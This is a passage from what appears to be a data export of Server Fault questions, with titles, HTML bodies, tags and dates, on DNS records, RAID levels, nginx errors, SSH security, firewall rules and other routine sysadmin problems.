<a href=""https://i.sstatic.net/C1Jmd.jpg"" rel=""nofollow noreferrer"">MxToolbox shows unwanted PTR TXT record</a></p>

<p>(2.) cPanel also notices and complains about the extra PTR record:
<a href=""https://i.sstatic.net/3gUOX.jpg"" rel=""nofollow noreferrer"">cPanel also complains about the extra PTR record</a></p>

<p>(3.) Yet my DNS records in Cloudflare only have one PTR TXT record, the one I want. 
<a href=""https://i.sstatic.net/d5g1S.jpg"" rel=""nofollow noreferrer"">DNS Records in Cloudflare</a></p>

<p>I haven't found anyone else with this same problem. Where could the PTR record to ""mediati.net"" be coming from !??</p>

<p>Paul</p>
","<domain-name-system><email><cloudflare><ptr-record><txt-record>","2020-03-25 05:21:28"
"1008337","What would you call this ""RAID"" ? RAID 1+6?","<p>I have Snapraid running as snapshot RAID6 (2-parity disks) for my 9 disk array which calculates new parity once a day. Then I have Drivepool duplicating certain very important folders on the array to all the data disks in realtime as in RAID1. </p>

<p>Would this still be considered as RAID1+6 even though it's kinda hybrid realtime/snapshot array or is there a different name for it?</p>
","<raid><raid1><snapshot><raid6>","2020-03-25 14:16:20"
"799445","How to safeguard server files from user entered code","<p>I am making a .NET web application which accepts python code from user and executes it on the server by giving command to command line. But using os.remove(), i am able to delete the files present on the drive through that python code. Kindly tell me how can i safeguard the server so that no file can be edited or deleted by any user. <br /><br />
PS: If the solution is to use any third party software, my budget will allow only free ones. Thanks in advance. </p>
","<security>","2016-08-27 04:04:26"
"1008387","Are devices on the same VLAN considered on the same network segment?","<p>Say you have two network segments connected by a router. In my <a href=""https://serverfault.com/questions/1008191/can-separate-network-segments-connected-by-a-router-be-considered-on-the-same-se/1008200#1008200"">previous question</a> we found that the two network segments are not on the same network segment when connected by a router. Now say you put the two aforementioned network segments in the same VLAN. Would the two network segments in the VLAN be considered on the same network segment?</p>
","<networking><vlan>","2020-03-25 19:38:53"
"1008391","Unindentified layout for RRAS logs","<p>I stumbled upon an unknown layout, without headers, which neither <a href=""https://iso.csusb.edu/tools/nps-log-interpreter"" rel=""nofollow noreferrer"">NPS Log Interpreter</a> nor <a href=""https://serverfault.com/questions/296687/ras-log-analyzer-pptp-l2tp-vpn"">IAS Log Viewer</a> can seem to understand. My Google-fu is spent and I've found zero documentation about it.</p>

<p>Lines go like this:</p>

<pre><code>server, ""RAS"", date, time, packet type?, username (sometimes has domain), username (always has domain), ip, ip, , ip, server, ip, numbers, ip, server, random number?, , 5, , 1, 2, 4/5, string, 0/68, string, empty/60, empty/1800, string, 1/2, , random number?, random number?, port?, empty/3, random/empty, random/empty, random/empty, empty/1, port?, empty/1, , emtpy/1, empty/1, ip, ip, , , , , , , string, 311, , hex string, number, number, policy?, 1, , , , hostname?, string
</code></pre>

<p>I feel like I've stumbled upon this before, but so far I've found 3 different layouts for treating RRAS logs and none of those fit these lines.</p>
","<logging><rras>","2020-03-25 19:56:19"
"1008413","A Record change on messing hosting setup","<p>Freelance web developer here seeking some advice...</p>

<p>I am working with a client who wants to launch new website. Their registrar is FastHosts, which points to Sitegrounds namesevers (their DNS host).</p>

<p>I've built a new site which needs to run in a Node.js environment, but that isn't compatible with Sitegrounds hosting. So, I spun up an AWS EC2 server, copied it's public IP and replaced the A Record in Siteground  to the one provided by EC2.</p>

<p>However, the website just isn't loading when you visit their root domain. It's getting a 'the site cannot be reached - too long to respond' error.</p>

<p>If I visit the public IP address of the EC2 instance in the browser, the website loads.</p>

<p>We also cannot get rid of Siteground, as it hosts various 'subdomain-ed' websites.</p>

<p>I'm completely stuck. Have done this right? Is what I'm trying to achieve even possible?</p>

<p>Any guidance would be much appreciated.</p>
","<domain-name-system><amazon-web-services><a-record>","2020-03-25 22:59:20"
"799508","Configure my first vServer","<p>I recently rented my first vServer (Ubuntu, LAMP + Webmin preinstalled). I need it because of a Java app I wrote that should run as a game server on it. I'm familiar with Ubuntu as I'm using it as my primary OS since 2 years. I'm also fimiliar with some basic ""linux""/shell, networking stuff and also run my own LAMP on my notebook before. So I thought I would be able to administrate a vServer. 
But there a few things I'm not sure about. 
What I did so far is changing ports of webmin and ssh and took a look in the apache2.conf file (seems allright). I changed the root password and tried to change the mysql root password to. Here I got my first issues:</p>

<ol>
<li><p>I could not set any password for mysql root user. Neither per ssh/mysql   nor within webmin. How can I do that?</p></li>
<li><p>Why are there so many mysql users (mysql-sys, debian-sys-maint)?</p></li>
<li><p>I've run netstat for open ports and as excpected it shows ssh, apache and webmin. But when I make a portscan with Zenmap I see also 5 more (filtered) ports (msrpc, netbios-ns, netbios-dgm, netbios-ssn, microsoft-ds). When I make a udp scan there seem to be even more ports opened. How's that coming?</p></li>
<li><p>My Java app needs to open udp/tcp sockets dynamically at runtime. So it would be nice to declare some firewall rules that deny all incoming/outcoming sockets except those from/for a given program (basically ssh, apache, webmin
and my java app). How can one do this?</p></li>
<li><p>Does it make sense to install an ips like snort?</p></li>
<li><p>Is it sufficient to let webmin check/install updates on a daily basis to keep the system up to date? ( I guess I have to update Java manually, since I have to install it manually too)</p></li>
<li><p>Is there something else I need to do for security?</p></li>
<li><p>Lets suppose my server gets hacked and someone starts doing illegal stuff with it. I know that I'm liable for the server but what would be the worst case consequences for me?</p></li>
</ol>

<p>It would be nice if someone has the time to answer my questions or give some links on the topic for further reading.
thx and regards</p>
","<ubuntu><mysql><security><firewall><snort>","2016-08-27 14:58:22"
"1008469","iLO Interface connections of storage device in the server rack","<p>I have a setup of 3 racks. In each there are 2 storage server (HP DL560 GEN8) and 4 compute server (HP DL360 GEN8) and 2 control planes (HP DL360 GEN8) and on top of the rack 2 patch panels. Above all the 3 racks two spine switches are used to connect all of them. Please check the picture below as an example of one rack.</p>

<p><a href=""https://i.sstatic.net/EowGf.png"" rel=""nofollow noreferrer"">Racklayout End of Row (EoR)</a></p>

<p>I am not sure if I need to make further connections, e.g. connecting storage device to compute device through an iLO (HP propriety internet port)?</p>

<p>Does the overall topology look ok, or do I miss something?</p>

<p>Any help/ feedback will be much appreciated!</p>

<p>Many thanks and please let me know if more info is required. Turan</p>
","<hp><interface><rack><network-topology>","2020-03-26 09:16:33"
"799518","wifi card in 1u rack","<p>So I bought a 1u server with the intention of putting it into a data centre. However before I get to this step I need to develop on it for a couple of months in my house. I think noise if going to be an issue from what I've read and heard on the videos so my thoughts are I'm going to put this thing in my basement or roof. However connectivity then becomes an issues. I was wondering if I can put a wifi card (PCI Express) card into one of these things. The antennas look a bit big i'm not sure the card looks like it will fit to be honest. Is this a viable solution. The hope is that then I will be able to get this wifi card connecting to my internet router then I'll be remoting into the server via wifi as well? Will the 1u PCI card fit and does anyone see a problem with this approach?</p>

<p>Thanks</p>
","<linux><networking>","2016-08-27 15:53:22"
"1008483","How does Google return a different A record every time?","<p>I used the DNS lookup tool too find the <code>Name Server</code> and <code>A Records</code> entries for www.google.com</p>

<p>Here is what it said</p>

<pre><code>www.google.com results

ns2.google.com

IN  172.217.15.68
</code></pre>

<p>It showed a single A record and the CNAME records were not found. But when I resolved <code>www.google.com</code> from different networks, it returned me different IP addresses. How are they doing this? Do they use DNS Round Robin? But how come I found only one A record then?</p>

<pre><code>$ dig www.google.com +short
172.217.21.164

$ dig www.google.com +short
216.58.211.4

$ dig www.google.com +short
172.217.20.36
</code></pre>
","<domain-name-system><ip><nameserver><round-robin>","2020-03-26 10:35:56"
"1008727","Disparity of allocated IPv4 addresses between US and China","<p>According to <a href=""https://ipinfo.io/"" rel=""nofollow noreferrer"">IPinfo.io</a>, United States has <a href=""https://ipinfo.io/countries/us"" rel=""nofollow noreferrer"">1,103,394,048</a> IPv4 allocated addresses, while China only <a href=""https://ipinfo.io/countries/cn"" rel=""nofollow noreferrer"">342,840,576</a>, despite having <a href=""https://countryeconomy.com/countries/compare/china/usa?sc=XE23"" rel=""nofollow noreferrer"">four times</a> more population.</p>

<p>Is there any legal/historical/technical reason for this disparity?</p>
","<ip><ipv4><country>","2020-03-27 17:58:34"
"1008742","Show the encrypted string for the user ‘ironman’ from the file /etc/shadow","<p>I created a user and I want to encrypt a string for that user from the /etc/shadow.
How can I go about doing that</p>
","<linux><centos7>","2020-03-27 19:33:04"
"799775","In which Interface do I change MX Records?","<p>Many sites that provide both domain registration and website hosting (GoDaddy, Dynadot, etc.) have two interfaces: a DNS panel administering the domain, which includes setting MX records, the other for managing the hosting (this is usually cPanel, for example). cPanel has an interface for administering email and setting MX records.</p>

<p>This means that if you do not purchase hosting, but instead just use GoDaddy as a domain registrar, you can still use the DNS panel to administer nameservers, etc.</p>

<p>Now suppose that I'm trying to migrate e-mail to an external service, e.g. Google Apps for Work. To do this, I have to change the MX records to point to Google's mail servers. </p>

<p>The question is: in which interface (DNS panel / cPanel) should I change the MX records? Does one of them have strict priority over the other?</p>
","<mx-record><g-suite><godaddy>","2016-08-29 15:23:59"
"1008762","Modify OpenLDAP hashing algorithm","<p>I have a CentOS7 Server running slapd 2.4.44 and I'd like to modify the default hashing algorithm being used. Instead of using SSHA, i'd like to use SHA-256 or SHA-512.</p>

<p>I've been having trouble finding documentation on this and I'd like to ask if anyone can provide a link to any resources to put me on the right track.</p>

<p>I've read a few articles that mentioned using CRYPT to instruct OpenLDAP to use a strong encryption scheme but bash returns an error when I try those commands. </p>

<p>For example, I entered the following at the terminal..</p>

<p>password-hash {CRYPT}
password-crypt-salt-format ""$6$%.16s""</p>

<p>""bash: password-hash: command not found...""</p>

<p>Is there a file I should be modifying instead?</p>

<p>Thanks!</p>
","<centos7><openldap><encryption><hash>","2020-03-27 22:18:38"
"1008804","Search YouTube from Linux CLI and return URL","<p>How can I search YouTube from the Linux command line terminal, and return the URL?</p>

<p>I've found <a href=""https://unix.stackexchange.com/questions/495998/cli-utility-to-search-and-view-download-youtube-videos"">StackExchange: CLI utility to search and view/download YouTube videos</a></p>
","<ubuntu>","2020-03-28 05:40:19"
"1008819","i want to visualize myself about bandwidth of internet","<p>as we know bandwidth is just a way through which data flows.20 Mbps internet means 20 mega bits per second and 40 Mbps means 40 mega bits per second.i guess 20 Mbps means 20 Mb of data is retrieved in 1 second and 40 Mbps means 40 Mb retrieved in one second.is it like we get more data at less time so we have to pay more or what?please visualize me.</p>
","<networking><internet><bandwidth><isp><network-speed>","2020-03-28 09:56:55"
"1008833","Username didn't change properly","<p>I've chaned my username (with admin privileges) using <a href=""https://www.isunshare.com/windows-10/3-ways-to-change-user-account-name-in-windows-10.html"" rel=""nofollow noreferrer"">this method</a>, name has changed but in C:/Users there is still the same folder with the old name. How can I change this folder name?</p>

<p>I'm using windows 10 x64</p>
","<windows>","2020-03-28 12:03:00"
"799870","Nginx config can't reload. Have ""bind() to 0.0.0.0:80 failed (98: Address already in use)"" errors","<p>I tried installing an HTTPS certificate, and after banging my head against the wall for a few hours, I realized that Nginx is NOT picking up the changes I made in my site configuration files contained within <code>/etc/nginx/sites-available/</code></p>

<p>When I run <code>service nginx restart</code> it restarts fine. When I run <code>nginx -t</code> it says my syntax is OK and my config test is successful. However, when I run <code>service nginx reload</code> I get an error that says <code>reload: Not running</code></p>

<p>When I look in <code>/var/log/nginx/error.log</code> I have these errors.</p>

<pre><code>2016/08/29 16:04:40 [emerg] 14744#14744: bind() to 0.0.0.0:80 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to 0.0.0.0:443 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to [::]:80 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to 0.0.0.0:80 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to 0.0.0.0:443 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to [::]:80 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to 0.0.0.0:80 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to 0.0.0.0:443 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to [::]:80 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to 0.0.0.0:80 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to 0.0.0.0:443 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to [::]:80 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to 0.0.0.0:80 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to 0.0.0.0:443 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: bind() to [::]:80 failed (98: Address already in use)
2016/08/29 16:04:40 [emerg] 14744#14744: still could not bind()
</code></pre>

<p>After Googling around, I ran across this command <code>netstat -plutn | grep 80</code> which gives me...</p>

<pre><code>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      14642/nginx: worker
tcp6       0      0 :::80                   :::*                    LISTEN      14642/nginx: worker
</code></pre>

<p>I have no idea what this really means, but reading around, it seems Nginx should NOT be running on port 80? Nginx is my webserver, don't I want it running on port 80?</p>

<p>Not sure how to proceed. I want Nginx to pick up the changes I made in my site config files with the <code>service nginx reload</code> command, and at the same time I'm hesitant to just copy/paste commands I find around the net since I have 10 websites hosted on this server.</p>

<p>Where am I going wrong? I have tried deleting the <code>default</code> file in my <code>sites-available</code> folder as some have suggested, but I just don't really understand what the problem is, and how to fix it.</p>
","<ubuntu><nginx><configuration><https>","2016-08-29 23:22:52"
"799956","different servers on different ports: friendly url?","<p>I have different servers for different applications running on different ports and I want users to use friendly url to browse the applications. e.g.</p>

<ul>
<li>localhost:8080 run by tomcat -> I want users to use localhost/jira as url</li>
<li>localhost:9000 run by python -> I want users to use localhost/confluence as url</li>
<li>localhost:3600 run by nodeJS-> I want users to use localhost/app as url</li>
</ul>

<p>and so on... applications should also be able to use SSL.</p>

<p>Is there a way to do this?</p>

<p>Thanks a lot</p>
","<redirect><port><url>","2016-08-30 10:46:25"
"800117","Azure malicious activity / SSH brute force","<p>Recently, I got e-mail from Microsoft Azure Safeguards Team saying that there was a complaint of malicious activity originating from my deployment (VM).</p>

<p>Description is: ""SSH Brute Force"".</p>

<p>Now, I wasn't even remotely sure what this means. That someone used my VM for some malicious activity, and brute forced into it, or used it to brute force somewhere else?</p>

<p>I'm pretty sure no one had access to my Ubuntu Azure VM since last password change.</p>

<p>It was said that all this may result in suspension of my deployment. And I can't afford that because this machine is used to deploy a business application.</p>

<p>So my question is - what methods of protection should I look into, in order to prevent incidents as the one described above? What else should I use besides firewall on a Linux VM in cloud(Azure)? For now, the port 22 is closed, until I resolve this issue.</p>

<p>Thanks.</p>
","<ubuntu><ssh><azure>","2016-08-31 02:38:30"
"800179","unable to ping VM on another machine within the same network","<p>I can't ping from one VM to another VM on different machine. Both are connecting on the same wifi.</p>

<ul>
<li>firewall has been disable</li>
<li>ICMP enable</li>
<li>Network connection = NAT</li>
</ul>
","<ubuntu><virtual-machines><ping>","2016-08-31 10:01:52"
"1010241","Accidentally deleted openssl lib packages and can't get yum","<p>Accidentally deleted openssl lib packages and can't get yum or wget to work again</p>

<p>can anyone please help</p>
","<redhat>","2020-03-31 13:08:14"
"1010279","Can only Putty into EC2 spot machine one time","<p>I'm creating AWS EC2 spot machine instances in the AWS console based on ami-062f7200baf2fa504 (Linux 64-bit, amzn2-ami-hvm-2.0.20191217.0-x86_64_gp2). I can SSH into the instances once without problems using Putty (hostname: ec2-user), but if I close the instance window and try to Putty in again, I either get an ""Server unexpectedly closed network connection"" error or ""Network error: Software caused connection abort."" So, I can only Putty into these machines one time. </p>

<p>I'm using a launch template to create my spot instances. I can successfully SSH into spot requests based on another AMI multiple times using the same launch template with the same configuration aside from the AMI (like VPC, subnet, instance type) and using the same settings in Putty (except changing the hostname to reflect the other AMI, which is a custom one a colleague built). </p>

<p>Any ideas about why I can't SSH into spot requests based on ami-062f7200baf2fa504 multiple times and how to fix that? Thanks.</p>
","<ssh><amazon-web-services><amazon-ec2>","2020-03-31 15:10:20"
"1010308","I would like to create report of users with multi factor turned on and those that dont have it","<p>I would like to run a report that lists amount of users that have multi factor tuned on and those that dont - if I could output it to a spreadsheet that would be real helpful.</p>
","<powershell>","2020-03-31 19:06:56"
"800312","How to use vps to connect two machines behind NAT via openvpn without giving access to VPS?","<p>I have two linux machines behind NAT routers which I do not control. I want to use a third, publicly accessible server (some cheap vps) to act as a middle-man, where the two endpoints can both connect. </p>

<p>I could easily accomplish this by making the VPS the openvpn server, but then it would have access to all the decrypted traffic between the endpoints. How can I configure it so that the middle-man vps does not have access to the key (I plan to use shared keys for this). </p>
","<openvpn>","2016-08-31 19:30:50"
"1010355","Mount a directory on a new partition or disk","<p>I would like to know how to mount a directory on a new partition or disk.
I have a directory, example: /u01/app/mylab/data
Inside this I have several files and directories, with specific permissions of other users and groups.
This directory is short on space and so I presented the server with a new disk for the purpose of mounting /u01 (and all its subdirectories including permissions) on this new disk with enough space.
I run mount /dev/sdb /u01 and when ready it doesn't show the content and I have to run umount /dev/sdb. Please, how can I do it?</p>
","<linux><permissions><mount><partition><directory>","2020-04-01 05:42:17"
"800350","32 TB RAID... Should I use 5 or 6?","<p>A friend directed me here for this question.</p>

<p>I am putting together a RAID.  It will be composed of 4 8TB drives and I am trying to decide what RAID level to use.</p>

<p>Originally I was going to go with RAID 5 but I have been reading that with that much storage RAID 5 can be a bit risky.  So I was wondering what you all would do.</p>

<p>A bit about the data and how it will be used:</p>

<ol>
<li>It is very expensive data so it must be safe.</li>
<li>Write speed is not super important.  Data will rarely be written but it will be written in huge chunks.  Like several TBs at a time.  So while it would suck if the write speed is terrible, we wouldn't have to deal with that problem very often.</li>
<li>Read speed is very important.  Large amounts of data will be accessed at once.</li>
</ol>

<p>So it seems like RAID 6 is the way to go.... but I am just wondering how dangerous RAID 5 really is with a RAID this size.  What is everyone's experience?  How likely is it for me to need dual parity protection?  If it is a huge risk, then I am willing to deal with the awful write speed and loss of 8TB of space.  But if this is just an overly cautious sort of thing I would rather go with RAID 5.</p>

<p>What do you all think?  RAID 5 or RAID 6?  Also is there another RAID level that might fit my needs better?</p>

<p>Thanks in advance for any help!</p>
","<raid>","2016-08-31 22:36:41"
"800404","How to access Public Ip","<p>I am unable to access my linux server's public ip address The only ip address i can access is Private ip address.</p>

<p>I asked my hosting provider to help me regarding this issue but they just said
""You simply need to generate a private key for your server and then you will be able to use the public ip. Unefortunately we don't provide assistance about it.""</p>

<p>I just want to know how can i generate private key to access my public ip address.</p>
","<ip>","2016-09-01 07:17:03"
"800472","System crashed - After reboot logs contain ""^@""","<p>I mentioned that my linux-server crashed suddenly without any warning.</p>

<p>In the syslog the following is shown:</p>

<pre><code>Sep  1 15:13:47 example kernel: [4514929.741761] Firewall: *UDP_IN Blocked* IN=vmbr0 OUT= MAC=ff:ff:ff:ff:ff:ff:0c:c4:7a:77:38:28:08:00 SRC=123.123.123.123 DST=255.255.255.255 LEN=173 TOS=0x00 PREC=0x00 TTL=64 ID=47121 DF PROTO=UDP SPT=17500 DPT=17500 LEN=153
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^$
Sep  1 15:17:50 example systemd-modules-load[817]: Module 'fuse' is builtin
Sep  1 15:17:50 example systemd-modules-load[817]: Inserted module 'vhost_net'
Sep  1 15:17:50 example hdparm[856]: Setting parameters of disc: (none).
Sep  1 15:17:50 example systemd-fsck[1015]: /dev/sda3: Journal wird wiederhergestellt
Sep  1 15:17:50 example systemd-fsck[1015]: /dev/sda3: sauber, 314/62592 Dateien, 40617/250112 Blöcke
</code></pre>

<p>But what does the <code>^@</code> mean?</p>
","<linux><debian><server-crashes><crashlytics>","2016-09-01 13:44:10"
"1010566","How to make old router as access point?","<p>I have installed a new router at my home, the new router has 4 ports. And the  ISP only allowed for one port to have internet connection using ethernet. That port is taken by another person, and now only 3 ports left that don't have internet connection.</p>

<p>Is it possible to make my old router as a switch to share the internet connection with that one port that works? </p>

<p>I've tried to connect my old router to any of the 3 ports left, but I cannot access the internet. </p>
","<router><switch><isp><access-point>","2020-04-02 12:33:29"
"800546","firewalld deny all from subnet but allow some services","<p>I wanted to create a zone named ""bad"" with a target=reject and source=10.100.0.0/24 which will basically reject all traffic from that subnet.
In the zone.</p>

<p>Now, if I want to allow traffic to SSH from that subnet, how can I do that?</p>

<p>I tried adding service SSH to ""bad"" zone but no luck, then I tried to add a rich rule no luck...</p>

<p>I tried to do what a firewall would normally do, which is denying all request that didn't match any rule...</p>

<p>Thanks</p>
","<linux><centos><firewalld>","2016-09-01 19:03:40"
"1010619","Cannot select vm size","<p>I cant select virtual machine size while creating a virtual machine in free trial of azure Microsoft account.
How to see required size is available in which region.</p>
","<azure><virtual-machines>","2020-04-02 17:38:15"
"1010722","/var/log wrongly shows as 100% space used","<p>On some of our servers <code>/var/log</code>, which is a separate ext4 partition, shows that 100% of the 4.8G of space is in use. But it actually occupies around 200M of disk space. Application can still write logs to the directory. What could be the cause of this bug?</p>

<p><strong>Other information:</strong><br>
Debian version: 9.9<br>
Inodes use 1%</p>
","<debian><disk-space-utilization>","2020-04-03 09:42:56"
"800695","Command-line tool to show bandwidth percentage usage","<p>In a Linux server, I need to see the network percentage utilization, like for example you can see into the windows task manager:</p>

<p><a href=""https://i.sstatic.net/YK71M.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/YK71M.png"" alt=""enter image description here""></a></p>

<p>Do you know some linux <strong>command line (NOT GUI)</strong> tool which do this job?
I googled a lot, but i didn't find anything like what i need..</p>
","<linux><networking><bash><command-line-interface>","2016-09-02 10:20:12"
"1010853","SMTP Server and HTTP Server on a single VPS","<p>I have a VPS (CentOS 7) with an Apache HTTP server already running on it, with its own domain. But, I also want to send emails from that domain, so that I have a website called example.com and I can send emails as johnsmith@example.com.</p>

<p>I know that one can use a SMTP server on their VPS, and I have heard of it being possible to have 2 servers at once on a single VPS. </p>

<p>So I have set up postfix on my VPS and I can send emails from localhost to localhost, but I don't know how to set up the DNS records. I cannot point to mail.example.com because that google domains tells me that the record is already in use. Does anyone know how to go about this?</p>
","<domain-name-system><smtp><http><vps>","2020-04-04 02:27:31"
"1010865","Automatic switching between ethernet and 4G on router?","<p>I have a router which have both incoming internet through Ethernet and 4G via USB. My fiber connection is unstable, and I have gotten a courtesy 4G SIM from my ISP. Is it possible to set up the router in such a way that when fiber connection fails, it automatically switches to 4G?</p>

<p>I have an ASUS 2900 router and an open 4G USB stick.</p>
","<router><ethernet><asus>","2020-04-04 07:30:11"
"800826","Is Quality of Service my ISP's responsibility?","<p>One person on my network does a massive download, not caring too much about how long it takes. Someone else on my network doesn't want his incessant video streaming interrupted. My understanding is that this is solved using QoS, to prioritize streaming packets over update downloads, or packets from one source over another source.</p>

<p>However, I think the link that gets congested here is the one between me and my ISP. I am guessing that if QoS was configured on my end, packets would still be sent indiscriminately to my router, they would still de-bottleneck even though my router is prioritizing them, and there would be no difference in performance. (I attempted to include a diagram to explain this but apparently I don't have enough reputation.)</p>

<p>If I wanted the streamer's stuff to be prioritized, would that  have to be set up on the ISP's end or is there anything I can do on my own network?</p>

<p>I apologize for my noobishness.</p>
","<networking><qos><bottleneck>","2016-09-02 22:25:13"
"800855","How to prevent others from reverse-resolving my IP address?","<p>I have a self-managed dedicated server.</p>

<p>My hosting provier assigns a hostname associated with a static IP.</p>

<p>eg. myhost.dedicated-server.com and 123.123.123.123</p>

<p>I'm hosting multiple domains using 123.123.123.123</p>

<p>When internet users perform a ping to one of my domains:</p>

<p>eg. <code>ping mydomain.com</code></p>

<p>The result is showing:</p>

<pre><code>PING mydomain.com (123.123.123.123) 56(84) bytes of data.
64 bytes from myhost.dedicated-server.com (123.123.123.123): icmp_seq=1 ttl=49 time=173 ms
</code></pre>

<p>I don't want to display my reverse-resolving hostname to the public users.</p>

<p>How can this be accomplished?</p>

<p>A working example is when I <code>ping cloudflare.com</code></p>

<p>It shows:</p>

<pre><code>PING cloudflare.com (198.41.214.162) 56(84) bytes of data.
64 bytes from 198.41.214.162: icmp_seq=1 ttl=53 time=278 ms
</code></pre>
","<networking><routing><ip><ping><hostname>","2016-09-03 07:41:05"
"800935","Site listing by location","<p>Apologies if this is the incorrect tag for this question.  </p>

<p>Is there a publicly available list to discover all sites that are registered by country? For example all internet sites that are registered/created in Ireland ?</p>

<p>Googling 'list of Internet sites by country' does not offer such information. </p>
","<domain-name-system>","2016-09-03 22:19:31"
"801041","Which IO read/write characteristic is more important for Virtual machine type 2: 4K or sequential","<p>IO devices often specify their characteristics in terms of:</p>

<ul>
<li>sequential read/write;</li>
<li>4K read/write;</li>
</ul>

<p>Which characteristic is more important for performance of Virtual machine type 2 (like VirtualBox which runs on top of host operation system) :</p>

<ul>
<li>4K or sequential?</li>
<li>read or write?</li>
</ul>
","<virtual-machines><performance-tuning>","2016-09-04 21:33:33"
"801087","Configure OpenSSH SFTP Server to authentificate users against MySQL Database","<p>Im looking for a way to authenticate the users of our OpenSSH SFTP Server against a MySQL Database. This would be nice because I want to add users through a webinterface which will write in the MySQL Database. The reason for this is that I find it kind of a unpleasant solution to add a system user for every client that wants to download data. Also many of these users are going to download files from the same directories so it's absolutely useless to chroot everyone in his own home directory because they should be chrooted in costum directories.</p>

<p>I know I can do this with proftpd and SSL but if I can avoid using FTP I would do so. </p>
","<linux><ssh><authentication><sftp><file-sharing>","2016-09-05 08:06:48"
"801256","Why is my moved domain still serving a placeholder from the previous hosting company?","<p>This may be basic stuff, but I'm a programmer, so fairly technical on the server/systems side, but not proficient.</p>

<p>I've moved two domainnames from one hosting to another, and can't get one to work. The domainname is cvnp.be and as you can see, it has the Easyhost placeholder. Easyhost is my previous hosting company.</p>

<p>However, I've set up Cloudflare for this domain, and as you can see in a <a href=""http://www.dnsstuff.com/tools#whois|type=domain&amp;&amp;value=cvnp.be"" rel=""nofollow noreferrer"">DNS lookup</a>, the two Cloudflare nameservers are being used.</p>

<p>In Cloudflare, I've added the necessary records, just like I did for the domain that is working:</p>

<p><a href=""https://i.sstatic.net/PyI9X.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/PyI9X.png"" alt=""Cloudflare""></a></p>

<p>The IP address you can see, is the one from my new hosting company (Interserver):</p>

<p><a href=""https://i.sstatic.net/MbonR.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/MbonR.png"" alt=""Interserver""></a></p>

<p>It's been more than 12 hours (but not 24), I've purged the Cloudflare cache, and still I see the Easyhost placeholder... Where is this placeholder being served from, and how can I get it to show the contents I've uploaded to Interserver (an Orchard CMS site)?</p>
","<domain-name-system><web-hosting><cloudflare>","2016-09-06 06:48:12"
"801273","Nginx force port 8080 to use SSL and rewrite or redirect http to https","<p>Hi I am forcing nginx to use SSL for port <code>8080</code>, here is my conf:</p>

<pre><code>server {
        listen        8080 ssl;
        server_name   example.com;
        access_log   /var/log/nginx/access.log  main;

        include /etc/nginx/ssl.conf;

        location / {
            proxy_pass         http://192.168.1.20;
        }

    }
</code></pre>

<p>the <code>https://example.com:8080</code> works fine but when use <code>http://example.com:8080</code> the nginx has the error message shown:</p>

<pre><code>The plain HTTP request was sent to HTTPS port
</code></pre>

<p>now my question is how to get <code>http://example.com:8080</code> auto redirect or rewrite to <code>https://example.com:8080</code> by editing my nginx conf file?</p>
","<nginx><proxy><rewrite>","2016-09-06 08:18:15"
"801291","Is there an online command reference for vim-cmd in ESXi?","<p>After asking several questions about the ESXi command line tool <code>vim-cmd</code> I was wondering: is there an (online) command reference for this utility? I can find lots of info for specific commands and some quickstart tutorials, but no complete reference documentation. Is something like that available?</p>
","<vmware-esxi>","2016-09-06 09:16:09"
"1011414","How to block all ports for specific public ips using fail2ban with iptables","<p>Kindly share the steps how to block all ports with specific public ips using fail2ban with iptables. I want to block all ports for the given ips by me and share the file name too. where i need to configure.</p>
","<fail2ban>","2020-04-08 10:10:55"
"1011460","Nginx will not start","<p>I'm currently trying to get nginx set up to help me run a website from home. I've followed the following instructions to set up nginx: </p>

<pre><code>sudo apt update
sudo apt install nginx
sudo ufw app list
sudo ufw allow 'Nginx HTTP'
sudo ufw status
</code></pre>

<p>Once I try to run <code>sudo systemctl start nginx</code>, I get </p>

<pre><code>Job for nginx.service failed because the control process exited with error code.
See ""systemctl status nginx.service"" and ""journalctl -xe"" for details.
</code></pre>

<p>Running <code>systemctl status nginx</code> I get the following:</p>

<pre><code>nginx.service - A high performance web server and a reverse proxy server
   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)
   Active: failed (Result: exit-code) since Wed 2020-04-08 16:00:43 BST; 9min ago
     Docs: man:nginx(8)
  Process: 8820 ExecStartPre=/usr/sbin/nginx -t -q -g daemon on; master_process on; (code=exited, status=1/FAILURE)

Apr 08 16:00:43 AMCosyClub systemd[1]: Starting A high performance web server and a reverse proxy server...
Apr 08 16:00:43 AMCosyClub nginx[8820]: nginx: [emerg] directive ""root"" is not terminated by "";"" in /etc/nginx/conf.d/writefreely.conf:6
Apr 08 16:00:43 AMCosyClub nginx[8820]: nginx: configuration file /etc/nginx/nginx.conf test failed
Apr 08 16:00:43 AMCosyClub systemd[1]: nginx.service: Control process exited, code=exited status=1
Apr 08 16:00:43 AMCosyClub systemd[1]: nginx.service: Failed with result 'exit-code'.
